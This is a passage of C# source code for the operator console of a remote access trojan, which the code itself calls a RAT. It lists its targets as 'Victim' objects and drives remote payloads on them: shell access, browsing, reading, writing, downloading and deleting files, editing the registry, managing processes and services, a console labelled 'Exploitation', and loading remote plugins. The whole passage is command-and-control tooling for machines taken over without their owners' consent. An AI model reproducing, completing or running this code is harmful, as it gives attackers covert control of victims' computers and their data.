                    for (int i = index; i < prompt_tb.Text.Length; i++)
                        sb.Append(prompt_tb.Text[i]);
                    string command = sb.ToString();

                    string[] lines = prompt_tb.Lines.ToArray();
                    string line = lines[lines.Length - 2] + lines[lines.Length - 1];
                    v.RunPayload("Shell", v, new string[] { exec_tb.Text, command, line });
                }
                else
                {
                    try
                    {
                        if (prompt_tb == null) return;

                        int index = (int)prompt_tb.Tag;
                        if (prompt_tb.SelectionStart < index || (e.KeyCode == Keys.Up || e.KeyCode == Keys.Down))
                        {
                            e.Handled = true;
                            return;
                        }
                        if (prompt_tb.SelectionStart == index && (e.KeyCode == Keys.Back || e.KeyCode == Keys.Left || e.KeyCode == Keys.Delete))
                        {
                            e.Handled = true;
                            return;
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }

        private void reg_tv_AfterSelect(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            var _var = reg_GetControls();
            TreeNode selected_node = _var.tv.SelectedNode;
            _var.txt.Text = selected_node.FullPath;
            _var.lv.Items.Clear();
            _var.lv.Tag = selected_node.FullPath;

            if (selected_node.Parent == null) //ROOT
            {
                v.RunPayload("RegEdit", v, new string[] { "l", selected_node.Text, "" });
            }
            else
            {
                string full_path = selected_node.FullPath;
                string root_key_text = full_path.Split('\\')[0];
                string sub_path = full_path.Replace($@"{root_key_text}\", string.Empty);
                v.RunPayload("RegEdit", v, new string[] { "l", root_key_text, sub_path });
            }
        }
        private void reg_TextBoxKeyDown(object sender, KeyEventArgs e)
        {

        }

        //EVENT [END]

        //C & C FUNCTION [START]
        TabPage FindTabPage(Victim v, Function func, string path = null)
        {
            if (tabControl2.TabCount == 1)
                return null;


            TabPage _page = null;
            for (int i = 1; i < tabControl2.TabCount; i++)
            {
                TabPage page = tabControl2.TabPages[i];
                object[] tag = (object[])page.Tag;
                if ((Victim)tag[0] == v && (Function)tag[1] == func)
                {
                    if (path != null)
                    {
                        if (tag[2].ToString() == path)
                        {
                            _page = page;
                            break;
                        }
                    }
                    else
                    {
                        _page = page;
                        break;
                    }
                }
            }

            return _page;
        }

        void ClientDetails()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage _page = new TabPage();
                _page.Text = @"Details\\" + v.rAddr;
                _page.Tag = new object[] { v, Function.Details };
                tabControl2.TabPages.Add(_page);
                tabControl2.SelectedTab = _page;
                ListView lv = new ListView();
                lv.Columns.Add("Name");
                lv.Columns.Add("Value");
                lv.Columns[0].Width = 200;
                lv.Columns[1].Width = 200;
                _page.Controls.Add(lv);
                lv.Dock = DockStyle.Fill;
                lv.View = View.Details;
                v.RunPayload("Details", v);
            }
        }

        void FileManager()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage _page = null;
                _page = FindTabPage(v, Function.FileManager);
                if (_page == null)
                {
                    //SAMPLE
                    _page = tabs_dict["file_manager"];
                    TextBox _txt_path = (TextBox)_page.Controls[0];
                    SplitContainer _sc = (SplitContainer)_page.Controls[1];
                    StatusStrip _ss = (StatusStrip)_page.Controls[2];
                    TreeView _tv = (TreeView)_sc.Panel1.Controls[0];
                    ListView _lv = (ListView)_sc.Panel2.Controls[0];

                    //BUILD
                    TabPage page = new TabPage();
                    TextBox txt_path = new TextBox();
                    SplitContainer sc = new SplitContainer();
                    StatusStrip ss = new StatusStrip();
                    TreeView tv = new TreeView();
                    ListView lv = new ListView();

                    page.Text = @"FileManager\\" + v.rAddr;
                    page.Tag = new object[] { v, Function.FileManager };
                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(txt_path);
                    page.Controls.Add(sc);
                    page.Controls.Add(ss);

                    SetProperty(_txt_path, txt_path);

                    //TREEVIEW
                    sc.Panel1.Controls.Add(tv);
                    tv.ImageList = imageList1;
                    tv.Dock = DockStyle.Fill;
                    tv.AfterSelect += FileTreeViewAfterSelect;

                    //LISTVIEW
                    foreach (ColumnHeader h in _lv.Columns)
                    {
                        ColumnHeader _h = new ColumnHeader();
                        _h.Width = h.Width;
                        _h.Text = h.Text;
                        lv.Columns.Add(_h);
                    }
                    sc.Panel2.Controls.Add(lv);
                    lv.Dock = DockStyle.Fill;
                    lv.View = View.Details;
                    lv.SmallImageList = C2.il;
                    lv.FullRowSelect = true;
                    lv.ContextMenuStrip = contextMenuStrip2;
                    lv.DoubleClick += FileListViewDoubleClick;

                    //STATUS STRIP
                    ss.Dock = DockStyle.Bottom;
                    ss.Items.Add(new ToolStripStatusLabel() { Font = _ss.Items[0].Font });
                    tabControl2.SelectedTab = page;

                    //SPLIT CONTAINER
                    sc.Anchor = _sc.Anchor;
                    sc.Size = new Size(txt_path.Width, ss.Location.Y - txt_path.Location.Y - 6 * 2 - ss.Size.Height);
                    sc.Location = _sc.Location;
                    sc.SplitterDistance = _sc.SplitterDistance;
                    sc.FixedPanel = FixedPanel.Panel1;
                }
                else
                {
                    tabControl2.SelectedTab = _page;
                }
                v.RunPayload("File", v, new string[] { "i" }); //INITIALIZATION
            }
        }

        public void FileListViewRefresh()
        {
            tabControl2.Invoke(new Action(() =>
            {
                var _var = file_GetControls();
                TreeView tv = _var.tv;
                TreeNode node = _var.node;
                tv.SelectedNode = node;
            }));
        }

        void ReadFileOrOpenDir()
        {
            TabPage page = tabControl2.SelectedTab;
            SplitContainer sc = page.Controls[1] as SplitContainer;
            TreeView tv = sc.Panel1.Controls[0] as TreeView;
            ListView lv = sc.Panel2.Controls[0] as ListView;
            foreach (ListViewItem item in lv.SelectedItems)
            {
                object[] objs = (object[])item.Tag;
                string path = objs[1].ToString();
                if (objs[0].ToString() == "Folder")
                {
                    TreeNode node = FindTreeNodeByFullPath(tv.Nodes, path);
                    tv.SelectedNode = node;
                }
                else //FILE
                {
                    Victim v = (Victim)((object[])page.Tag)[0];
                    TabPage _page = new TabPage();
                    _page.Text = @"ReadFile\\" + v.rAddr;
                    _page.Tag = new object[] { v, Function.ReadFile, path };
                    tabControl2.TabPages.Add(_page);
                    tabControl2.SelectedTab = _page;

                    TextBox txt1 = new TextBox(); //FILE PATH
                    _page.Controls.Add(txt1);

                    TextEditorControl editor = new TextEditorControl();
                    editor.Text = "";
                    _page.Controls.Add(editor);

                    TextBox txt2 = new TextBox(); //SEARCH BAR
                    txt2.KeyDown += TextEditorSearchText_KeyDown;
                    txt2.Click += TextEditorSearchBar_Click;
                    txt2.Tag = true; //FIRST CLICK
                    _page.Controls.Add(txt2);

                    StatusStrip ss = new StatusStrip();
                    ToolStripItem[] items =
                    {
                        new ToolStripStatusLabel(),
                        new ToolStripStatusLabel(),
                        new ToolStripStatusLabel(),
                    };
                    foreach (ToolStripItem _item in items)
                        ss.Items.Add(_item);

                    _page.Controls.Add(ss);
                    ss.Dock = DockStyle.Bottom;
                    txt1.Dock = DockStyle.Top;
                    txt2.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
                    txt2.Size = txt1.Size;
                    txt2.Location = new Point(ss.Location.X, ss.Location.Y - 6 - txt2.Size.Height);

                    editor.Location = new Point(txt1.Location.X, txt1.Location.Y + txt1.Size.Height + 6);
                    editor.Size = new Size(txt1.Width, txt2.Location.Y - txt1.Height - 6 * 2);
                    editor.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
                    editor.Tag = 0; //SEARCH TEXT INDEX
                    editor.KeyDown += TextEditorWriteFile_KeyDown;

                    v.RunPayload("File", v, new string[] { "rf", path });
                }
            }
        }

        void WriteFile()
        {
            TabPage page = tabControl2.SelectedTab;
            Victim v = (Victim)((object[])page.Tag)[0];
            TextBox txt = (TextBox)page.Controls[0];
            TextEditorControl editor = (TextEditorControl)page.Controls[1];
            string path = txt.Text;
            string content = editor.Text;
            string b64_content = Convert.ToBase64String(Encoding.UTF8.GetBytes(content));
            v.RunPayload("File", v, new string[] { "wf", path, b64_content });
        }
        
        void UploadFile()
        {
            f_ft = new frmFileTransferStatus();
            TabPage page = tabControl2.SelectedTab;
            TreeView tv = ((SplitContainer)page.Controls[1]).Panel1.Controls[0] as TreeView;
            ListView lv = ((SplitContainer)page.Controls[1]).Panel2.Controls[0] as ListView;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string cd = lv.Tag.ToString();
                bool unix_like = !cd.Contains(":");
                cd = unix_like ? "/" + cd.Replace("/", "\\") : cd;
                //TreeNode node = FindTreeNodeByFullPath(tv.Nodes, cd);
                Victim v = (Victim)((object[])page.Tag)[0];
                
            }

            f_ft.ShowDialog();

            //AFTER CLOSE DIALOG
            string _cd = lv.Tag.ToString();
            TreeNode node = FindTreeNodeByFullPath(tv.Nodes, _cd);
            if (node != null)
                tv.SelectedNode = node;
        }

        void df_SendRequest(object obj)
        {
            object[] objs = (object[])obj;
            Victim v = (Victim)objs[0];
            List<string> entries = (List<string>)objs[1];
            foreach (string entry in entries)
            {
                Download_Status[v] = UDF_Code.Wait;
                v.RunPayload("File", v, new string[] { "df", entry, "0" });
                while (Download_Status[v] == UDF_Code.Wait && Download_Status[v] != UDF_Code.Stop)
                    Thread.Sleep(10);
            }
            MessageBox.Show("Done", "Download", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Download_Status.Remove(v);
            df_offset.Remove(v);
        }
        void DownloadFile()
        {
            TabPage page = tabControl2.SelectedTab;
            ListView lv = ((SplitContainer)page.Controls[1]).Panel2.Controls[0] as ListView;
            Victim v = (Victim)((object[])page.Tag)[0];
            bool exist_folder = false;
            List<string> entries = new List<string>();
            foreach (ListViewItem item in lv.SelectedItems)
            {
                bool is_dir = item.SubItems[1].Text.Contains("d");
                if (item.SubItems[1].Text.Contains("d") && !exist_folder)
                {
                    MessageBox.Show(
                        "Folder found, currently, this RAT is not for support download folders directly, but you can zip the folders and download it!",
                        "Download",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning
                        );
                    exist_folder = true; //THIS MESSAGE WILL NOT SHOW ANY MORE IN THIS LOOP.
                }
                if (!is_dir)
                    entries.Add(Path.Combine(lv.Tag.ToString(), item.Text));
            }
            new Thread(new ParameterizedThreadStart(df_SendRequest)).Start(new object[]
            {
                v,
                entries,
            });
        }

        void DeleteFile_Request(object obj)
        {
            object[] objs = (object[])obj;
            Victim v = (Victim)objs[0];
            string path = (string)objs[1];
            v.RunPayload("File", v, new string[] { "del", path });
        }
        void DeleteFile()
        {
            //THREADPOOL INITIALIZATION
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(thd_count, thd_count);

            Victim v = GetVictimInCurrentTab();
            var _var = file_GetControls();
            List<string> tasks = new List<string>();
            delete_task[v] = tasks;
            foreach (ListViewItem item in _var.lv.SelectedItems)
            {
                object[] objs = (object[])item.Tag;
                string type = (string)objs[0];
                string path = (string)objs[1];
                path = type == "Folder" ? path + "/" : path;
                tasks.Add(path);
            }
            for (int i = 0; i < tasks.Count; i++)
            {
                string path = tasks[i].ToString();
                ThreadPool.QueueUserWorkItem(DeleteFile_Request, new object[]
                {
                    v,
                    path,
                });
            }
        }

        void ShowImage()
        {
            var _var = file_GetControls();
            Victim v = GetVictimInCurrentTab();

            if (FindActiveForm(v, Function.ShowImage, show_err: false) == null)
            {
                frmFileImage f_fi = new frmFileImage();
                f_fi.Tag = new object[] { v, Function.ShowImage };
                f_fi.Show();
            }

            foreach (ListViewItem item in _var.lv.SelectedItems)
            {
                object[] objs = (object[])item.Tag;
                string type = (string)objs[0];
                string path = (string)objs[1];

                if (type != "File") return;

                string ext = Path.GetExtension(path);
                if (!C1.IsImage(ext)) return;

                v.RunPayload("File", v, new string[] { "img", path });
            }
        }

        void Archive_Compress()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = file_GetControls();
            string filename = Path.Combine(_var.lv.Tag.ToString(), C1.DateTimeName("zip")); //ZIP ARCHIVE NAME
            string entries = string.Join(",", _var.lv.SelectedItems.Cast<ListViewItem>().Select(s => ((object[])s.Tag)[1].ToString()));
            v.RunPayload("File", v, new string[] { "af_c", filename, entries });
        }
        void Archive_Extract()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = file_GetControls();
            string cd = _var.lv.Tag.ToString();
            string entries = string.Join(",", _var.lv.SelectedItems.Cast<ListViewItem>().Select(s => ((object[])s.Tag)[1].ToString()));
            v.RunPayload("File", v, new string[] { "af_e", "0", entries, cd });
        }

        void WGET()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = file_GetControls();

            frmWGET f_wget = new frmWGET();
            f_wget.Tag = new object[] { v, Function.WGET };
            f_wget.save_folder = _var.lv.Tag.ToString();
            f_wget.v = v;
            f_wget.form1 = this;
            f_wget.Text = $"WGET\\{v.rAddr}";

            f_wget.Show();
        }

        void NewEntity(bool is_folder = true)
        {
            var x = file_GetControls();
            frmFileNew f_new = new frmFileNew();
            f_new.is_folder = is_folder;
            f_new.v = GetVictimInCurrentTab();
            f_new.cp = x.lv.Tag.ToString();
            f_new.ShowDialog();
        }

        void Shell()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                bool unix_like = !item.SubItems[4].Text.ToLower().Contains("windows");
                TabPage page = new TabPage();
                page.Tag = new object[] { v, Function.Terminal };
                page.Text = @"Shell\\" + v.rAddr;
                tabControl2.TabPages.Add(page);

                TextBox exec_tb = new TextBox()
                {
                    Text = unix_like ? "/bin/bash" : @"C:\Windows\System32\cmd.exe",
                    BackColor = Color.Black,
                    ForeColor = Color.White,
                    Dock = DockStyle.Top,
                };
                page.Controls.Add(exec_tb);
                int height_delta = 1;
                TextBox prompt_tb = new TextBox()
                {
                    Multiline = true,
                    BackColor = Color.Black,
                    ForeColor = Color.White,
                    Location = new Point(exec_tb.Location.X, exec_tb.Location.Y + exec_tb.Size.Height + height_delta),
                    Size = new Size(exec_tb.Size.Width, page.Size.Height - exec_tb.Size.Height - height_delta),
                    Tag = 0, //INDEX
                    //Font = new Font("NSimSun", 15),
                    Font = new Font("Consolas", 13f),
                };
                prompt_tb.KeyDown += Shell_KeyDown;
                page.Controls.Add(prompt_tb);
                prompt_tb.Anchor = C1.AnchorStyle_All;
                prompt_tb.ScrollBars = ScrollBars.Both;
                tabControl2.SelectedTab = page;

                v.RunPayload("Shell", v, new string[] { exec_tb.Text, "cmd.exe", "" });
            }
        }

        void ProcessManager()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;

                TabPage page = FindTabPage(v, Function.Process);
                if (page == null)
                {
                    page = new TabPage();
                    SplitContainer sc = new SplitContainer();
                    TreeView tv = new TreeView();
                    ListView lv = new ListView();
                    StatusStrip ss = new StatusStrip();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(sc);
                    page.Controls.Add(ss);
                    page.Tag = new object[] { v, Function.Process };

                    sc.Panel1.Controls.Add(tv);
                    sc.Panel2.Controls.Add(lv);

                    ss.Dock = DockStyle.Bottom;

                    sc.Location = new Point(0, 0);
                    sc.Size = new Size(ss.Size.Width, page.Size.Height - ss.Size.Height);
                    sc.SplitterDistance = 200;
                    sc.FixedPanel = FixedPanel.Panel1;
                    sc.Anchor = C1.AnchorStyle_All;

                    tv.Dock = DockStyle.Fill;

                    lv.View = View.Details;
                    lv.Dock = DockStyle.Fill;
                    lv.FullRowSelect = true;
                    lv.ContextMenuStrip = proc_contextmenu;

                    //COLUMNS
                    string[] cols =
                    {
                        "PID",
                        "Image",
                        "Path",
                    };

                    foreach (string col in cols)
                    {
                        ColumnHeader c = new ColumnHeader();
                        c.Text = col;
                        c.Width = 300;
                        lv.Columns.Add(c);
                    }

                    ss.Items.AddRange(new ToolStripItem[]
                    {
                        new ToolStripStatusLabel() { Text = "Loading...", },
                    });

                    page.Text = @"Process\\" + v.rAddr;
                }

                tabControl2.SelectedTab = page;

                v.RunPayload("Manager", v, new string[] { "lp", "0" });
            }
        }

        void ServiceManager()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.Service);

                if (page == null)
                {
                    page = new TabPage();
                    ListView lv = new ListView();
                    StatusStrip ss = new StatusStrip();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(lv);
                    page.Controls.Add(ss);
                    page.Tag = new object[] { v, Function.Service };

                    ss.Dock = DockStyle.Bottom;

                    ss.Items.AddRange(new ToolStripItem[]
                    {
                        new ToolStripStatusLabel() { Text = "Loading...", },
                    });

                    lv.Location = new Point(0, 0);
                    lv.Size = new Size(ss.Size.Width, page.Size.Height - ss.Size.Height);
                    lv.Anchor = C1.AnchorStyle_All;
                    lv.View = View.Details;
                    lv.FullRowSelect = true;
                    lv.ContextMenuStrip = serv_contextmenu;

                    //COLUMNS
                    string[] cols_windows = { "DisplayName", "Name", "ProcessId", "SystemName", "Description", "State", "Accept Pause", "Accept Stop", "Path Name" };
                    string[] cols_linux = { "Id", "Name", "MainPID", "ControlPID", "ExecMainPID", "ActiveState", "AcceptPause", "AcceptStop", "ExecStart" };
                    foreach (string col in v.unix_like ? cols_linux : cols_windows)
                    {
                        ColumnHeader c = new ColumnHeader();
                        c.Text = col;
                        c.Width = 120;
                        lv.Columns.Add(c);
                    }

                    page.Text = @"Service\\" + v.rAddr;
                }
                tabControl2.SelectedTab = page;
                v.RunPayload("Manager", v, new string[] { "ls" });
            }
        }

        void ConnectionManager()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.Connection);

                if (page == null)
                {
                    page = new TabPage();
                    ListView lv = new ListView();
                    StatusStrip ss = new StatusStrip();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(lv);
                    page.Controls.Add(ss);
                    page.Tag = new object[] { v, Function.Connection };

                    ss.Dock = DockStyle.Bottom;

                    ss.Items.AddRange(new ToolStripItem[]
                    {
                        new ToolStripStatusLabel() { Text = "Loading...", },
                    });

                    lv.Location = new Point(0, 0);
                    lv.Size = new Size(ss.Size.Width, page.Size.Height - ss.Size.Height);
                    lv.Anchor = C1.AnchorStyle_All;
                    lv.View = View.Details;
                    lv.FullRowSelect = true;
                    lv.ContextMenuStrip = conn_contextmenu;

                    //COLUMNS
                    string[] cols = { "Protocol", "Local IP", "Local Port", "Remote IP", "Remote Port", "Status", "PID", "Location" };
                    foreach (string col in cols)
                    {
                        ColumnHeader c = new ColumnHeader();
                        c.Text = col;
                        c.Width = 150;
                        lv.Columns.Add(c);
                    }

                    page.Text = @"Connection\\" + v.rAddr;
                }
                tabControl2.SelectedTab = page;

                v.RunPayload("Manager", v, new string[] { "lc" });
            }
        }

        void WMIC()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;

                if (v.unix_like) //CHECK VICTIM OPERATING SYSTEM IS Windows
                    return;

                TabPage page = FindTabPage(v, Function.WMIC);
                if (page == null)
                {
                    page = new TabPage();
                    RichTextBox prompt = new RichTextBox();

                    page.Tag = new object[] { v, Function.WMIC };
                    page.Controls.Add(prompt);
                    tabControl2.TabPages.Add(page);

                    prompt.Dock = DockStyle.Fill;
                    prompt.BackColor = Color.Black;
                    prompt.ForeColor = Color.White;
                    prompt.Font = Font;
                    //prompt.Font = new Font("NSimSun", 15);
                    prompt.Font = new Font("Consolas", 13f);
                    prompt.SelectionCharOffset = 2;
                    prompt.WordWrap = false;
                    prompt.ScrollBars = RichTextBoxScrollBars.Both;
                    prompt.KeyDown += WMIC_KeyDown;

                    prompt.AppendText("Welcome to WQL\n");
                    prompt.AppendText("Author : ISSAC\n");
                    prompt.AppendText("\n");
                    prompt.AppendText("> ");

                    prompt.Tag = prompt.Text.Length;

                    page.Text = @"WMIC\\" + v.rAddr;
                }
                else
                {

                }
                tabControl2.SelectedTab = page;
            }
        }

        //REGISTRY MANAGER
        void RegEdit()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;

                if (v.unix_like) //CHECK VICTIM OPERATING SYSTEM IS Windows.
                    continue;

                TabPage page = new TabPage();
                TextBox cd_txt = new TextBox();
                SplitContainer sc = new SplitContainer();
                TreeView tv = new TreeView();
                ListView lv = new ListView();

                page.Tag = new object[] { v, Function.RegEdit };
                page.Controls.Add(cd_txt);
                page.Controls.Add(sc);
                tabControl2.TabPages.Add(page);

                cd_txt.Dock = DockStyle.Top;
                cd_txt.KeyDown += reg_TextBoxKeyDown;

                sc.Panel1.Controls.Add(tv);
                sc.Panel2.Controls.Add(lv);

                sc.Location = new Point(cd_txt.Location.X, cd_txt.Location.Y + cd_txt.Size.Height);
                sc.Size = new Size(cd_txt.Size.Width, page.Size.Height - cd_txt.Size.Height);
                sc.Anchor = AnchorStyles.Bottom | AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
                sc.FixedPanel = FixedPanel.Panel1;
                sc.SplitterDistance = 200;

                lv.FullRowSelect = true;
                lv.SmallImageList = imageList3;
                lv.View = View.Details;
                lv.Dock = DockStyle.Fill;
                lv.ContextMenuStrip = reg_contextmenu;

                tv.Dock = DockStyle.Fill;
                tv.ImageList = imageList3;
                tv.ImageIndex = 5;
                tv.SelectedImageIndex = 6;
                tv.AfterSelect += reg_tv_AfterSelect;
                tv.ContextMenuStrip = regtv_contextmenu;

                string[] cols = { "Name", "Type", "Data" }; //COLUMNS
                foreach (string col in cols)
                {
                    ColumnHeader c = new ColumnHeader();
                    c.Text = col;
                    c.Width = 200;
                    lv.Columns.Add(c);
                }

                page.Text = @"RegEdit\\" + v.rAddr;
                tabControl2.SelectedTab = page;

                //EXECUTE PAYLOAD
                v.RunPayload("RegEdit", v, new string[] { "i" });
            }
        }
        void reg_Goto()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = reg_GetControls();
            string path = _var.txt.Text;
            string root_key_text = path.Split('\\')[0];
            string sub_path = path.Replace($@"{root_key_text}\", string.Empty);
            v.RunPayload("RegEdit", v, new string[] { "g", root_key_text, sub_path });
        }
        void reg_Import()
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "reg file|*.reg";
            if (ofd.ShowDialog() == DialogResult.OK)
            {

            }
        }
        void reg_Export()
        {
            var x = reg_GetControls();
            Victim v = GetVictimInCurrentTab();
            frmRegExport f = new frmRegExport();
            f.Text = $@"Export\\{v.rAddr}";
            f.path = x.txt.Text;
            f.v = v;
            f.ShowDialog();
        }
        void reg_New()
        {
            var x = reg_GetControls();
            Victim v = GetVictimInCurrentTab();
            frmRegAdd f = new frmRegAdd();
            f.v = v;
            f.path = x.lv.Tag.ToString();
            f.ShowDialog();
        }
        void reg_Edit()
        {
            Victim v = GetVictimInCurrentTab();
            frmRegEdit f = new frmRegEdit();
            f.ShowDialog();
        }
        void reg_Delete()
        {
            var _var = reg_GetControls();
            string[] da = _var.lv.SelectedItems.Cast<ListViewItem>().Select(x => $@"{_var.txt.Text}\\{x.Text}").ToArray();
            if (da.Length == 0) return;
            Victim v = GetVictimInCurrentTab();

            DialogResult r = MessageBox.Show($@"Are you sure to delete {da.Length} data?");
            if (r == DialogResult.Yes) v.RunPayload("RegEdit", v, new string[] { "d", string.Join(",", da.Select(x => C1.StrE2B64Str(x)).ToArray()) });
        }
        void reg_Refresh()
        {
            Invoke(new Action(() =>
            {
                var _var = reg_GetControls();
                TreeNode node = FindTreeNodeByFullPath(_var.tv.Nodes, _var.lv.Tag.ToString());
                if (node == null) return;

                _var.tv.SelectedNode = node;
            }));
        }

        void PCControl()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                frmPCControl f_control = new frmPCControl();
                f_control.Text = @$"PC Control\\{v.rAddr}";
                f_control.v = v;
                f_control.Show();
            }
        }

        void ClientConfig()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.ClientConfig);
                if (page == null)
                {
                    page = new TabPage();
                    ListView lv = new ListView();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(lv);
                    page.Tag = new object[] { v, Function.ClientConfig };
                    page.Text = $@"ClientConfig\\{v.rAddr}";

                    lv.Dock = DockStyle.Fill;
                    lv.View = View.Details;
                    lv.FullRowSelect = true;
                    lv.Columns.Add(new ColumnHeader() { Text = "Item", Width = 300 });
                    lv.Columns.Add(new ColumnHeader() { Text = "Value", Width = 300 });

                    ListViewItem _item = new ListViewItem("Folder");
                    _item.SubItems.Add(Path.Combine(new string[] { Application.StartupPath, "Victim", v.ID }));

                    lv.Items.Add(_item);
                }

                tabControl2.SelectedTab = page;
            }
        }

        void Exploitation()
        {
            tabControl1.SelectedIndex = 1;
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = fram_FindTabPage(v);
                if (page == null)
                {
                    page = new TabPage();
                    RichTextBox prompt = new RichTextBox();
                    TextBox input = new TextBox();
                    tabControl3.TabPages.Add(page);
                    page.Controls.Add(prompt);
                    page.Controls.Add(input);

                    input.Dock = DockStyle.Bottom;
                    input.BackColor = Color.Black;
                    input.ForeColor = Color.White;
                    input.Font = new Font("Consolas", 13f);
                    input.KeyDown += Console_InputCmd;

                    prompt.BackColor = Color.Black;
                    prompt.ForeColor = Color.White;
                    prompt.Location = new Point(0, 0);
                    prompt.Size = new Size(input.Width, page.Size.Height - input.Size.Height);
                    prompt.Anchor = C1.AnchorStyle_All;
                    prompt.Font = new Font("Consolas", 13f);
                    prompt.ReadOnly = true;
                    prompt.WordWrap = false;

                    tabControl3.SelectedTab = page;

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.EnableRaisingEvents = true;

                    p.OutputDataReceived += new DataReceivedEventHandler(ConsoleOutputReceived_Events);
                    p.Start();

                    p.BeginOutputReadLine();
                    p.BeginErrorReadLine();

                    page.Tag = new object[] { v, p };
                    page.Text = $"z_{v.rAddr}";

                    prompt.Clear();
                    p.StandardInput.WriteLine(@$"cd payload\python\console&python main.py --reception");
                    prompt.Text = string.Empty;
                }
                else
                {

                }
            }
        }

        //REMOTE PLUGINS
        void RemotePlugin()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.RemotePlugin);

                if (page == null)
                {
                    page = new TabPage();
                    TextBox t = new TextBox();
                    ListView lv = new ListView();
                    StatusStrip ss = new StatusStrip();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(t);
                    page.Controls.Add(lv);
                    page.Controls.Add(ss);
                    page.Tag = new object[] { v, Function.RemotePlugin };

                    t.Dock = DockStyle.Top;
                    t.ReadOnly = true;
                    t.BackColor = Color.FromArgb(255, 255, 192);

                    ss.Dock = DockStyle.Bottom;
                    ss.Items.AddRange(new ToolStripItem[]
                    {
                        new ToolStripStatusLabel() { Text = "Loading..." },
                    });

                    lv.Location = new Point(t.Location.X, t.Location.Y + t.Size.Height);
                    lv.Size = new Size(t.Width, page.Height - t.Height - ss.Height);
                    lv.View = View.Details;
                    lv.Anchor = C1.AnchorStyle_All;
                    lv.FullRowSelect = true;
                    lv.ContextMenuStrip = plugin_contextmenu;

                    string[] cols =
                    {
                        "Name",
                        "Type", //PUGIN (PAYLOAD) TYPE, PYTHON? DLL?
                        "Location", //INSTALL PATH
                        "Version", //PLUGIN VERSION
                        "Status", //BUILT? LOADED?
                        "Date Loaded",
                    };
                    foreach (string col in cols)
                    {
                        ColumnHeader c = new ColumnHeader();
                        c.Text = col;
                        c.Width = 120;
                        lv.Columns.Add(c);
                    }

                    page.Text = @$"RemotePlugin\\{v.rAddr}";
                }
                tabControl2.SelectedTab = page;

                v.RunPayload("RemotePlugin", v, new string[] { "i" });
            }
        }
        public void rPlugin_Refresh()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = rPlugin_GetControls(v);
            Invoke(new Action(() =>
            {
                _var.t.Text = string.Empty;
                _var.lv.Items.Clear();
                _var.ss.Items[0].Text = "Loading...";
                v.RunPayload("RemotePlugin", v, new string[] { "i" });
            }));
        }
        void rPlugin_Load()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = rPlugin_GetControls(v);
            DialogResult dr1 = MessageBox.Show("Upload from default dir?", "RemotePlugin", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr1 != DialogResult.Yes && dr1 != DialogResult.No) return; //QUIT

            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                List<string> files = ofd.FileNames.ToList();
                List<string> tmps = files;

                //CHECK MODULE EXISTED
                foreach (string file in tmps)
                {
                    string module_name = Path.GetFileNameWithoutExtension(file);
                    if (_var.lv.FindItemWithText(module_name) != null)
                    {
                        DialogResult dr2 = MessageBox.Show($"Find \"{module_name}\" in victim, load anyway ?", "Module existed", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                        if (dr2 != DialogResult.Yes) files.Remove(file);
                    }
                }

                //todo: upload
            }
        }
        void rPlugin_Remove()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = rPlugin_GetControls(v);
            foreach (ListViewItem item in _var.lv.SelectedItems)
            {
                //CHECK IS PIP
                object[] objs = (object[])item.Tag;
                rp_Type type = (rp_Type)objs[0];
                if (type == rp_Type.PIP)
                {
